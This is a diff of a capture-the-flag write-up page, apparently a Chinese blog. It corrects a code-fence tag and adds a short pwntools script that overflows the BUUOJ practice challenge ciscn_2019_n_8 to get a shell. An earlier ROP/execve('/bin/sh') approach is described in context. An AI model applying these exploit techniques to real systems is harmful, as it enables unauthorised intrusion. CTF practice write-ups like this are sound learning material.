@@ -310,7 +310,7 @@ icon: icon-html
 
   找一波gadgets，调用write找个地方写/bin/sh，然后在那溢出跑execve("/bin/sh",0,0)
 
-  ```p&#39;y&#39;t
+  ```python
   from pwn import *
   r = remote('pwn.buuoj.cn', 20154)
   context.arch = 'amd64'
@@ -341,7 +341,17 @@ icon: icon-html
   r.interactive()
   ```
 
-  
+* ### ciscn_2019_n_8
+
+  ```
+  from pwn import *
+  r = remote('pwn.buuoj.cn', 20144)
+  payload = p32(17)*14
+  r.sendline(payload)
+  r.interactive()
+  ```
+
+* 
 
 
 
